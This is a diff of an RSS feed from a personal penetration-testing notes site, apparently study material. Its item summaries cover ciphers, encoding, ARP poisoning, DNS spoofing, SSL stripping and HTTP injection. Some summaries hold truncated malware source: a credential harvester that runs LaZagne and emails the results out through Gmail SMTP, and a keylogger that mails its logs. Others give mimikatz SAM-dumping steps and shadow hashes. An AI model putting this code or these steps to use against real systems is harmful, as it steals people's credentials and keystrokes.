@@ -4,408 +4,254 @@
     <title>Home on Bxg7 Pentesting Docs</title>
     <link>http://localhost/</link>
     <description>Recent content in Home on Bxg7 Pentesting Docs</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en</language><atom:link href="http://localhost/index.xml" rel="self" type="application/rss+xml" />
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 09 Jan 2024 21:07:08 +0100</lastBuildDate>
+    <atom:link href="http://localhost/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>DNS request sniffing</title>
       <link>http://localhost/dns/dns_request_sniffing/</link>
       <pubDate>Sat, 09 Sep 2023 21:43:00 +0700</pubDate>
-      
       <guid>http://localhost/dns/dns_request_sniffing/</guid>
-      <description>After we become the mitm we can sniff the DNS Question Record&amp;rsquo;s QNAME field.
-I am using netfilterqueue here, but it could be done without it as well because we are not modifying any packets on the fly, we are only inspecting.
-To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:
-iptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:</description>
+      <description>After we become the mitm we can sniff the DNS Question Record&amp;rsquo;s QNAME field.&#xA;I am using netfilterqueue here, but it could be done without it as well because we are not modifying any packets on the fly, we are only inspecting.&#xA;To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:&#xA;iptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:</description>
     </item>
-    
     <item>
       <title>Books</title>
       <link>http://localhost/various/books/</link>
       <pubDate>Fri, 06 Jan 2023 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/various/books/</guid>
       <description> Penetration Testing: A Hands-On Introduction to Hacking The Web Application Hackers Handbook Computer Security: A Hands-on Approach Black Hat Python Buffer Overflow Attacks - Detect Exploit Prevent Cross Site Scripting Attacks Xss Exploits and Defense Cybersecurity - Attack and Defense Strategies Fuzzing Brute Force Vulnerability Discovery Hacking Exposed Linux Hacking The Art of Exploitation Kali Linux an Ethical Hackers Cookbook Mastering Kali Linux for Advanced Penetration Testing Penetration Testing A Hands On Introduction to Hacking Python Penetration Testing Essentials RTFM red team field manual TCP IP Guide Oct 2005 The Basics of Hacking and Penetration Testing The Basics of Web Hacking - Tools and Techniques to Attack the Web Understanding Network Hacks_ Attack and Defense With Python Violent Python - A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers Wireshark for Security Professionals Wireshark - Practical packet analysis to Solve Real World Problems </description>
     </item>
-    
     <item>
       <title>Malware example: backdoor</title>
       <link>http://localhost/malware/backdoor/</link>
       <pubDate>Sun, 03 Mar 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/malware/backdoor/</guid>
-      <description>In this example we are using a server listener on the attacker machine and a reverse backdoor on the client that connects to the server. This is more convenient then a connection that goes from attacker directly to the victim since firewalls might block it.
-When the connection is initiated from the victim to the attacker we can use a port like 8080 that is probably already open on the victims outbound firewall.</description>
+      <description>In this example we are using a server listener on the attacker machine and a reverse backdoor on the client that connects to the server. This is more convenient then a connection that goes from attacker directly to the victim since firewalls might block it.&#xA;When the connection is initiated from the victim to the attacker we can use a port like 8080 that is probably already open on the victims outbound firewall.</description>
     </item>
-    
     <item>
       <title>Malware example: credential harvesting</title>
       <link>http://localhost/malware/cross_platform_malware_example/</link>
       <pubDate>Wed, 27 Feb 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/malware/cross_platform_malware_example/</guid>
-      <description>Simple example of a cross platform malware program.
-It downloads the LaZagne credentials harvester (https://github.com/AlessandroZ/LaZagne) to the os specific temp directory, runs it using the &amp;lsquo;all&amp;rsquo; option and send the result via email.
-#!/usr/bin/env python import requests, subprocess, smtplib, os, tempfile def download(url): get_response = requests.get(url) file_name = url.split(&amp;#34;/&amp;#34;)[-1] with open(file_name, &amp;#34;wb&amp;#34;) as out_file: out_file.write(get_response.content) def send_mail(email, password, message): server = smtplib.SMTP(&amp;#34;smtp.gmail.com&amp;#34;, 587) server.starttls() server.login(email,password) server.sendmail(email, email, message) server.quit() temp_directory = tempfile.</description>
+      <description>Simple example of a cross platform malware program.&#xA;It downloads the LaZagne credentials harvester (https://github.com/AlessandroZ/LaZagne) to the os specific temp directory, runs it using the &amp;lsquo;all&amp;rsquo; option and send the result via email.&#xA;#!/usr/bin/env python import requests, subprocess, smtplib, os, tempfile def download(url): get_response = requests.get(url) file_name = url.split(&amp;#34;/&amp;#34;)[-1] with open(file_name, &amp;#34;wb&amp;#34;) as out_file: out_file.write(get_response.content) def send_mail(email, password, message): server = smtplib.SMTP(&amp;#34;smtp.gmail.com&amp;#34;, 587) server.starttls() server.login(email,password) server.sendmail(email, email, message) server.quit() temp_directory = tempfile.</description>
     </item>
-    
     <item>
       <title>Malware example: keylogger</title>
       <link>http://localhost/malware/keylogger/</link>
       <pubDate>Wed, 27 Feb 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/malware/keylogger/</guid>
-      <description>Example of a cross platform keylogger class using Threading.
-#!/usr/bin/env python import pynput.keyboard import threading import smtplib class Keylogger: def __init__(self, time_interval, email, password): self.log = &amp;#34;Keylogger started&amp;#34; self.interval = time_interval self.email = email self.password = password def append_to_log(self, string): self.log = self.log + string def process_key_press(self, key): try: current_key = str(key.char) except AttributeError: if key == key.space: current_key = &amp;#34; &amp;#34; else: current_key = &amp;#34; &amp;#34; + str(key) + &amp;#34; &amp;#34; self.</description>
+      <description>Example of a cross platform keylogger class using Threading.&#xA;#!/usr/bin/env python import pynput.keyboard import threading import smtplib class Keylogger: def __init__(self, time_interval, email, password): self.log = &amp;#34;Keylogger started&amp;#34; self.interval = time_interval self.email = email self.password = password def append_to_log(self, string): self.log = self.log + string def process_key_press(self, key): try: current_key = str(key.char) except AttributeError: if key == key.space: current_key = &amp;#34; &amp;#34; else: current_key = &amp;#34; &amp;#34; + str(key) + &amp;#34; &amp;#34; self.</description>
     </item>
-    
     <item>
       <title>One Time Pad</title>
       <link>http://localhost/cryptography/ciphers/otp/</link>
       <pubDate>Sun, 03 Feb 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cryptography/ciphers/otp/</guid>
-      <description>One-time pad (OTP), also called Vernam-cipher or the perfect cipher, is a crypto algorithm where plaintext is combined with a random key.
-It is the only existing mathematically unbreakable encryption.
-Used by Special Operations teams and resistance groups during WW2, popular with intelligence agencies and their spies during the Cold War and beyond, protecting diplomatic and military message traffic around the world for many decades, the one-time pad gained a reputation as a simple yet solid encryption system with an absolute security which is unmatched by today&amp;rsquo;s modern crypto algorithms.</description>
+      <description>One-time pad (OTP), also called Vernam-cipher or the perfect cipher, is a crypto algorithm where plaintext is combined with a random key.&#xA;It is the only existing mathematically unbreakable encryption.&#xA;Used by Special Operations teams and resistance groups during WW2, popular with intelligence agencies and their spies during the Cold War and beyond, protecting diplomatic and military message traffic around the world for many decades, the one-time pad gained a reputation as a simple yet solid encryption system with an absolute security which is unmatched by today&amp;rsquo;s modern crypto algorithms.</description>
     </item>
-    
     <item>
       <title>AES &amp; Padding Oracle Attack</title>
       <link>http://localhost/cryptography/strong_encryption/aes/</link>
       <pubDate>Fri, 01 Feb 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cryptography/strong_encryption/aes/</guid>
-      <description>Under construction&amp;hellip;
-https://crypto.stackexchange.com/questions/3714/how-does-a-padding-oracle-attack-work https://resources.infosecinstitute.com/padding-oracle-attack-2/#gref https://tlseminar.github.io/padding-oracle/
-https://thebestvpn.com/advanced-encryption-standard-aes/
-https://www.youtube.com/watch?v=1sdOaXTUGa4 https://robertheaton.com/2013/07/29/padding-oracle-attack/ https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth https://erlend.oftedal.no/blog/poet/
-x=1 ^ y=1 = 0 x=1 ^ y=0 = 1 x=0 ^ y=0 = 0 x=0 ^ y=1 = 1
-An intuitive way of understanding why XOR is associative is as follows:
-First recognize that XOR is commutative, that is, a⊕b=b⊕a. This can be done using a truth table.
-Then, think of the XOR operator as a &amp;lsquo;conditional flip&amp;rsquo; operator, that is think of a⊕b as saying if a is 1, take flipped b as the output, while if a is 0, take b as the output.</description>
+      <description>Under construction&amp;hellip;&#xA;https://crypto.stackexchange.com/questions/3714/how-does-a-padding-oracle-attack-work https://resources.infosecinstitute.com/padding-oracle-attack-2/#gref https://tlseminar.github.io/padding-oracle/&#xA;https://thebestvpn.com/advanced-encryption-standard-aes/&#xA;https://www.youtube.com/watch?v=1sdOaXTUGa4 https://robertheaton.com/2013/07/29/padding-oracle-attack/ https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth https://erlend.oftedal.no/blog/poet/&#xA;x=1 ^ y=1 = 0 x=1 ^ y=0 = 1 x=0 ^ y=0 = 0 x=0 ^ y=1 = 1&#xA;An intuitive way of understanding why XOR is associative is as follows:&#xA;First recognize that XOR is commutative, that is, a⊕b=b⊕a. This can be done using a truth table.&#xA;Then, think of the XOR operator as a &amp;lsquo;conditional flip&amp;rsquo; operator, that is think of a⊕b as saying if a is 1, take flipped b as the output, while if a is 0, take b as the output.</description>
     </item>
-    
     <item>
       <title>Linux Password Hash Cracking</title>
       <link>http://localhost/cryptography/hashing/linux_password_hashes/</link>
       <pubDate>Thu, 31 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cryptography/hashing/linux_password_hashes/</guid>
-      <description>Create 3 users in Linux and set their passwords:
-sudo useradd -r -s /bin/false john sudo useradd -r -s /bin/false mary sudo useradd -r -s /bin/false dennis sudo passwd john (using P@ssw0rd as password) sudo passwd mary (using P@ssw0rd as password) sudo passwd dennis (using P@ssw0rd999 as password) The /etc/shadow contents:
-sudo cat /etc/shadow | grep -E &amp;#39;john|mary|dennis&amp;#39; john:$6$WvpWG7ls$IDqt8f/xBMC8h7IB57pWrQ3o06MATJjby7wkF2hqKN2y4k7HgPg7yCknlM.lSaftV4UI0ZauJnL.RWVOGD.jb.:17927:::::: mary:$6$pwiGPdMP$CvjOQZPsnAaWVRwWcOjimPWdNzucgCIh6DAVWF5io0zn0hzjWJPkVDpUX6OryYaOahRu4t5TxMXgXEqPkIfRK1:17927:::::: dennis:$6$nJO6qY4r$YfG8AWh22sncAusvM..92uzphXtnbEej1rpyP0yrYSQlI7XATA9PEknEb52PVHxXH5C/Oxo46ssMEwZG6PGJp1:17927:::::: After each username comes $6 which indicates this is a password type 6, meaning its hashed using SHA-512, which is the most modern and secure form of password hashing.</description>
+      <description>Create 3 users in Linux and set their passwords:&#xA;sudo useradd -r -s /bin/false john sudo useradd -r -s /bin/false mary sudo useradd -r -s /bin/false dennis sudo passwd john (using P@ssw0rd as password) sudo passwd mary (using P@ssw0rd as password) sudo passwd dennis (using P@ssw0rd999 as password) The /etc/shadow contents:&#xA;sudo cat /etc/shadow | grep -E &amp;#39;john|mary|dennis&amp;#39; john:$6$WvpWG7ls$IDqt8f/xBMC8h7IB57pWrQ3o06MATJjby7wkF2hqKN2y4k7HgPg7yCknlM.lSaftV4UI0ZauJnL.RWVOGD.jb.:17927:::::: mary:$6$pwiGPdMP$CvjOQZPsnAaWVRwWcOjimPWdNzucgCIh6DAVWF5io0zn0hzjWJPkVDpUX6OryYaOahRu4t5TxMXgXEqPkIfRK1:17927:::::: dennis:$6$nJO6qY4r$YfG8AWh22sncAusvM..92uzphXtnbEej1rpyP0yrYSQlI7XATA9PEknEb52PVHxXH5C/Oxo46ssMEwZG6PGJp1:17927:::::: After each username comes $6 which indicates this is a password type 6, meaning its hashed using SHA-512, which is the most modern and secure form of password hashing.</description>
     </item>
-    
     <item>
       <title>Windows Password Hash Cracking</title>
       <link>http://localhost/cryptography/hashing/windows_password_hashes/</link>
       <pubDate>Thu, 31 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cryptography/hashing/windows_password_hashes/</guid>
-      <description>Create 3 users on Windows 2016 Server (i used evaluation version in VirtualBox)
-Disable Realtime Virus Protection:
-Create directory c:\mimikatz and open command prompt in this directory, then run this command to export the SAM database into the c:\mimikatz directory:
-reg save HKLM\SAM sam.hiv Download mimikatz from https://github.com/gentilkiwi/mimikatz/releases, extract to c:\mimikatz and run it from a command prompt:
-c:\mimikatz&amp;gt;mimikatz.exe In the mimikatz prompt run these commands:
-log privilege::debug token::elevate lsadump::sam sam.</description>
+      <description>Create 3 users on Windows 2016 Server (i used evaluation version in VirtualBox)&#xA;Disable Realtime Virus Protection:&#xA;Create directory c:\mimikatz and open command prompt in this directory, then run this command to export the SAM database into the c:\mimikatz directory:&#xA;reg save HKLM\SAM sam.hiv Download mimikatz from https://github.com/gentilkiwi/mimikatz/releases, extract to c:\mimikatz and run it from a command prompt:&#xA;c:\mimikatz&amp;gt;mimikatz.exe In the mimikatz prompt run these commands:&#xA;log privilege::debug token::elevate lsadump::sam sam.</description>
     </item>
-    
     <item>
       <title>MD5 &amp; SHA Hashes</title>
       <link>http://localhost/cryptography/hashing/md5/</link>
       <pubDate>Wed, 30 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cryptography/hashing/md5/</guid>
       <description>What is a hash? A hash is a way to make a &amp;lsquo;fingerprint&amp;rsquo; of a file You take all the bytes of a file and combine them together using a hashing algorithm This creates a fixed length hash value Changing any part of the file will result in a completely different hash value when recalculating So when you have two files that are supposed to be identical, you can verify this by comparing the hashes.</description>
     </item>
-    
     <item>
       <title>XOR Cipher</title>
       <link>http://localhost/cryptography/ciphers/xor/</link>
       <pubDate>Thu, 17 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cryptography/ciphers/xor/</guid>
-      <description>In cryptography, the simple XOR cipher is a type of additive cipher.
-XOR is short for exclusive or. It is a bitwise operator.
-If one of the two operands, but not both are true, the statement is true.
-XOR truth table:
-In the following example we ask for input text and key then calculate the length of the input string and store it in n.
-Then we iterate over each byte (each ASCII character) and perform a XOR operation (k XOR b in below example) on each bit within the byte.</description>
+      <description>In cryptography, the simple XOR cipher is a type of additive cipher.&#xA;XOR is short for exclusive or. It is a bitwise operator.&#xA;If one of the two operands, but not both are true, the statement is true.&#xA;XOR truth table:&#xA;In the following example we ask for input text and key then calculate the length of the input string and store it in n.&#xA;Then we iterate over each byte (each ASCII character) and perform a XOR operation (k XOR b in below example) on each bit within the byte.</description>
     </item>
-    
     <item>
       <title>Base64</title>
       <link>http://localhost/data/base64_encoding/</link>
       <pubDate>Wed, 16 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/data/base64_encoding/</guid>
-      <description>Base-64 encoding is a way encoding binary data into ASCII text so that it&amp;rsquo;s more easily transmitted in things like e-mail and HTML form data.
-Each Base64 digit represents exactly 6 bits of data. Three 8-bit bytes (i.e., a total of 24 bits) can therefore be represented by four 6-bit Base64 digits.
-If you have an ASCI string of 3 characters (=3 bytes) it turns into 24 bits, interpreted as 3 groups of 8 bits.</description>
+      <description>Base-64 encoding is a way encoding binary data into ASCII text so that it&amp;rsquo;s more easily transmitted in things like e-mail and HTML form data.&#xA;Each Base64 digit represents exactly 6 bits of data. Three 8-bit bytes (i.e., a total of 24 bits) can therefore be represented by four 6-bit Base64 digits.&#xA;If you have an ASCI string of 3 characters (=3 bytes) it turns into 24 bits, interpreted as 3 groups of 8 bits.</description>
     </item>
-    
     <item>
       <title>Caesar Cipher &amp; ROT13</title>
       <link>http://localhost/cryptography/ciphers/caesar_cipher/</link>
       <pubDate>Wed, 16 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cryptography/ciphers/caesar_cipher/</guid>
-      <description>Caesar Cipher The Caesar cipher is one of the earliest known and simplest ciphers.
-It is a type of substitution cipher in which each letter in the plaintext is &amp;lsquo;shifted&amp;rsquo; 3 numbers of places down the alphabet.
-In python we first define an alphabet string. When the ask for user input. We store the length of the user input into the n variable. We then iterate over each character in the string and find its location within the alphabet string and store it in the loc variable.</description>
+      <description>Caesar Cipher The Caesar cipher is one of the earliest known and simplest ciphers.&#xA;It is a type of substitution cipher in which each letter in the plaintext is &amp;lsquo;shifted&amp;rsquo; 3 numbers of places down the alphabet.&#xA;In python we first define an alphabet string. When the ask for user input. We store the length of the user input into the n variable. We then iterate over each character in the string and find its location within the alphabet string and store it in the loc variable.</description>
     </item>
-    
     <item>
       <title>L2 vs L3 switch</title>
       <link>http://localhost/networking/switches/</link>
       <pubDate>Sun, 13 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/networking/switches/</guid>
-      <description>When you ping across (so when you go from one interface to another/from one subnet to another) a router or a layer 3 switch, the layer 2 information is updated at each HOP (meaning the layer 2 headers are updated). The layer 3 information remains the same unless NAT is used.
-When you move from one VLAN to another VLAN on a layer3 switch, or move from one interface to another interface on a router the layer3 information is not changed but the layer 2 headers are rewritten.</description>
+      <description>When you ping across (so when you go from one interface to another/from one subnet to another) a router or a layer 3 switch, the layer 2 information is updated at each HOP (meaning the layer 2 headers are updated). The layer 3 information remains the same unless NAT is used.&#xA;When you move from one VLAN to another VLAN on a layer3 switch, or move from one interface to another interface on a router the layer3 information is not changed but the layer 2 headers are rewritten.</description>
     </item>
-    
     <item>
       <title>ARP spoof detection</title>
       <link>http://localhost/arp/arp_spoof_detector/</link>
       <pubDate>Thu, 10 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/arp/arp_spoof_detector/</guid>
-      <description>In order to detect if we are under attack we can use following code. It will check if the MAC address (.hwsrc field in ARP reply packet) that is associated with the spoofed IP address that the attacker is sending with the packet (.psrc field in ARP reply packet) differs from what we get back (=real mac address) when we run get_mac function.
-Some words on defense: https://security.stackexchange.com/questions/161173/how-exactly-do-you-protect-against-arp-spoofing-in-large-lans
-#!/usr/bin/env python import scapy.</description>
+      <description>In order to detect if we are under attack we can use following code. It will check if the MAC address (.hwsrc field in ARP reply packet) that is associated with the spoofed IP address that the attacker is sending with the packet (.psrc field in ARP reply packet) differs from what we get back (=real mac address) when we run get_mac function.&#xA;Some words on defense: https://security.stackexchange.com/questions/161173/how-exactly-do-you-protect-against-arp-spoofing-in-large-lans&#xA;#!/usr/bin/env python import scapy.</description>
     </item>
-    
     <item>
       <title>Binary</title>
       <link>http://localhost/data/binary/</link>
       <pubDate>Thu, 10 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/data/binary/</guid>
-      <description>Binary is Base 2, unlike our Decimal counting system which is Base 10. In other words, Binary has only 2 different numerals (0 and 1) to denote a value, unlike Decimal which has 10 numerals (0,1,2,3,4,5,6,7,8 and 9). A value in binary is sometimes represented by prepending the prefix 0b to the value.
-Example: 0b01011101</description>
+      <description>Binary is Base 2, unlike our Decimal counting system which is Base 10. In other words, Binary has only 2 different numerals (0 and 1) to denote a value, unlike Decimal which has 10 numerals (0,1,2,3,4,5,6,7,8 and 9). A value in binary is sometimes represented by prepending the prefix 0b to the value.&#xA;Example: 0b01011101</description>
     </item>
-    
     <item>
       <title>SSL stripping</title>
       <link>http://localhost/web/http/ssl_stripping/</link>
       <pubDate>Thu, 10 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/web/http/ssl_stripping/</guid>
-      <description>https://moxie.org/software/sslstrip/
-Sslstrip requires that the connection between the client and the sslstrip instance is done over plain HTTP.
-The connection from sslstrip to the webserver can be either HTTP and HTTPS.
-This means that if the client first requests the site with plain HTTP then sslstrip works. If instead the clients starts already with HTTPS since it either knows that the site is only accessible by HTTPS or if the browser enforces HTTPS because of a HSTS policy (preloaded or from earlier visits) then sslstrip will not work.</description>
+      <description>https://moxie.org/software/sslstrip/&#xA;Sslstrip requires that the connection between the client and the sslstrip instance is done over plain HTTP.&#xA;The connection from sslstrip to the webserver can be either HTTP and HTTPS.&#xA;This means that if the client first requests the site with plain HTTP then sslstrip works. If instead the clients starts already with HTTPS since it either knows that the site is only accessible by HTTPS or if the browser enforces HTTPS because of a HSTS policy (preloaded or from earlier visits) then sslstrip will not work.</description>
     </item>
-    
     <item>
       <title>ASCII</title>
       <link>http://localhost/data/ascii/</link>
       <pubDate>Wed, 09 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/data/ascii/</guid>
-      <description>Character set . Often used to represent english language characters. Originally it was 7-bit binary, which gave us 128 unique characters. The current standard is 8-bit (1 byte) or equivalently 2 hex digits per character. Computers can only understand numbers, so an ASCII code is the numerical representation of a character such as &amp;lsquo;a&amp;rsquo; or &amp;lsquo;1&amp;rsquo;.
-Example:
-character &amp;ldquo;1&amp;rdquo; hex 0x31 first nibble = 3 which is 0011 in binary (count the weight of the columns: 8421) second nibble = 1 = which is 0001 in binary (count the weight of the columns: 8421) The full byte binary value is 0011 0001 which is 49 in decimal (32+16+1) The key thing to remember: the character &amp;ldquo;1&amp;rdquo; is NOT the same thing as the number 1.</description>
+      <description>Character set . Often used to represent english language characters. Originally it was 7-bit binary, which gave us 128 unique characters. The current standard is 8-bit (1 byte) or equivalently 2 hex digits per character. Computers can only understand numbers, so an ASCII code is the numerical representation of a character such as &amp;lsquo;a&amp;rsquo; or &amp;lsquo;1&amp;rsquo;.&#xA;Example:&#xA;character &amp;ldquo;1&amp;rdquo; hex 0x31 first nibble = 3 which is 0011 in binary (count the weight of the columns: 8421) second nibble = 1 = which is 0001 in binary (count the weight of the columns: 8421) The full byte binary value is 0011 0001 which is 49 in decimal (32+16+1) The key thing to remember: the character &amp;ldquo;1&amp;rdquo; is NOT the same thing as the number 1.</description>
     </item>
-    
     <item>
       <title>DNS spoofing</title>
       <link>http://localhost/dns/dns_spoofing/</link>
       <pubDate>Wed, 09 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/dns/dns_spoofing/</guid>
-      <description>After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.
-After spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.
-For this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.
-To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:</description>
+      <description>After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.&#xA;After spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.&#xA;For this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.&#xA;To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:</description>
     </item>
-    
     <item>
       <title>Hex</title>
       <link>http://localhost/data/hex/</link>
       <pubDate>Wed, 09 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/data/hex/</guid>
-      <description>Hexadecimal is a base 16 system used to simplify how binary is represented.
-A hex digit can be any of the following 16 digits: 0 1 2 3 4 5 6 7 8 9 A B C D E F.
-Every HEX digit is represented by a sequence of 4 bits (also sometimes called a &amp;ldquo;nibble&amp;rdquo;).
-4 bits is exactly half of a byte, which is 8 bits.
-A value in HEX is often represented by prepending the prefix 0x to the value.</description>
+      <description>Hexadecimal is a base 16 system used to simplify how binary is represented.&#xA;A hex digit can be any of the following 16 digits: 0 1 2 3 4 5 6 7 8 9 A B C D E F.&#xA;Every HEX digit is represented by a sequence of 4 bits (also sometimes called a &amp;ldquo;nibble&amp;rdquo;).&#xA;4 bits is exactly half of a byte, which is 8 bits.&#xA;A value in HEX is often represented by prepending the prefix 0x to the value.</description>
     </item>
-    
     <item>
       <title>HTTP code injection &amp; BeEF</title>
       <link>http://localhost/web/http/http_code_injection/</link>
       <pubDate>Wed, 09 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/web/http/http_code_injection/</guid>
-      <description>After we become the mitm we can modify HTTP responses by changing the Raw data on the fly.
-Since most clients will request [content encoding][http_compression] (by adding a &amp;ldquo;Accept-Encoding&amp;rdquo; header), the HTTP response data (scapy.Raw layer) will look like gibberish.
-This is is because the data is GZIPPED most of the time. To get around this we can simply delete this header from the HTTP request!
-https://en.wikipedia.org/wiki/HTTP_compression
-We also need to make sure we change the size of the &amp;ldquo;Content-Length&amp;rdquo; value to match with our injected code.</description>
+      <description>After we become the mitm we can modify HTTP responses by changing the Raw data on the fly.&#xA;Since most clients will request [content encoding][http_compression] (by adding a &amp;ldquo;Accept-Encoding&amp;rdquo; header), the HTTP response data (scapy.Raw layer) will look like gibberish.&#xA;This is is because the data is GZIPPED most of the time. To get around this we can simply delete this header from the HTTP request!&#xA;https://en.wikipedia.org/wiki/HTTP_compression&#xA;We also need to make sure we change the size of the &amp;ldquo;Content-Length&amp;rdquo; value to match with our injected code.</description>
     </item>
-    
     <item>
       <title>HTTP credentials sniffing</title>
       <link>http://localhost/web/http/credentials_sniffer/</link>
       <pubDate>Wed, 09 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/web/http/credentials_sniffer/</guid>
-      <description>After we become the mitm we can sniff all HTTP requests. This time using scapy&amp;rsquo;s buildin sniffing function.
-In the code we are checking for HTTP credentials.
-To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:
-Full code:
-import scapy.all as scapy from scapy.layers import http def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def get_url(packet): return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path def get_login_info(packet): if packet.</description>
+      <description>After we become the mitm we can sniff all HTTP requests. This time using scapy&amp;rsquo;s buildin sniffing function.&#xA;In the code we are checking for HTTP credentials.&#xA;To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:&#xA;Full code:&#xA;import scapy.all as scapy from scapy.layers import http def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def get_url(packet): return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path def get_login_info(packet): if packet.</description>
     </item>
-    
     <item>
       <title>Modifying HTTP download response</title>
       <link>http://localhost/web/http/replace_download/</link>
       <pubDate>Wed, 09 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/web/http/replace_download/</guid>
-      <description>After we become the mitm we can modify HTTP responses by changing the Raw data.
-In this case we check if the victim is downloading a .exe file and we are changing the response from the server so that it includes are own malicious payload.
-We do check against the destination port (dport) and source port (sport). When a sport is present it is a response, when a dport is present it is a request.</description>
+      <description>After we become the mitm we can modify HTTP responses by changing the Raw data.&#xA;In this case we check if the victim is downloading a .exe file and we are changing the response from the server so that it includes are own malicious payload.&#xA;We do check against the destination port (dport) and source port (sport). When a sport is present it is a response, when a dport is present it is a request.</description>
     </item>
-    
     <item>
       <title>Arp cache poisoning</title>
       <link>http://localhost/arp/arp_cache_poisoning/</link>
       <pubDate>Sun, 06 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/arp/arp_cache_poisoning/</guid>
-      <description>With Scapy you can easily send crafted ARP reply packets. The idea is to constantly send the victim ARP replies telling it we are the router.. We do the same for the router, we tell it we are the victim machine. After we become the man in the middle we can intercept &amp;amp; inspect all data.
-To allow forwarding of packets between the victim and the gateway we need to enable ip_forward:</description>
+      <description>With Scapy you can easily send crafted ARP reply packets. The idea is to constantly send the victim ARP replies telling it we are the router.. We do the same for the router, we tell it we are the victim machine. After we become the man in the middle we can intercept &amp;amp; inspect all data.&#xA;To allow forwarding of packets between the victim and the gateway we need to enable ip_forward:</description>
     </item>
-    
     <item>
       <title>Network scanning using arp</title>
       <link>http://localhost/arp/arp_scanning/</link>
       <pubDate>Sun, 06 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/arp/arp_scanning/</guid>
-      <description>We can scan the LAN by sending an ARP request to the broadcast mac address iterating over every IP we specify.
-When a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF), it is delivered to all stations on the local network.
-Arp request says: &amp;ldquo;who has 192.168.0.10?&amp;rdquo;
-If a host with ip 192.168.0.10 is online it will reply with an ARP reply message saying: &amp;ldquo;I have 192.168.0.10, my mac address is 00:22:33:44:55:66&amp;rdquo;</description>
+      <description>We can scan the LAN by sending an ARP request to the broadcast mac address iterating over every IP we specify.&#xA;When a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF), it is delivered to all stations on the local network.&#xA;Arp request says: &amp;ldquo;who has 192.168.0.10?&amp;rdquo;&#xA;If a host with ip 192.168.0.10 is online it will reply with an ARP reply message saying: &amp;ldquo;I have 192.168.0.10, my mac address is 00:22:33:44:55:66&amp;rdquo;</description>
     </item>
-    
     <item>
       <title>Session Management Intro</title>
       <link>http://localhost/web/webapps/session_management_intro/</link>
       <pubDate>Tue, 01 Jan 2019 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/web/webapps/session_management_intro/</guid>
       <description>Since HTTP is a stateless protocol (meaning if you send two requests to the same server, it has no idea it came from the same user) the idea of the session came along. The session is basically just an object kept in memory by the Web Application so that it can identify each user. After the initial request from a user the server will reply back with the session ID and every time a new request comes in from that same user the assigned ID will be in the request.</description>
     </item>
-    
     <item>
       <title></title>
       <link>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/security_controls/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/security_controls/</guid>
       <description>Security Controls mitigates vulnerabilities and risk to ensure the confidentiality, integrity,availability, nonrepudiation, and authentication of data Security controls should be selected and deployed in a structured manner using a risk management framework Security Controls are classified using a special publication by NIST called &amp;ldquo;NIST SP 800-53&amp;rdquo;. Its not needed to know this document for the exam but its useful for daily work. Some examples of Security Control Categories from this document are:</description>
     </item>
-    
     <item>
       <title></title>
       <link>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/selecting_controls/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/selecting_controls/</guid>
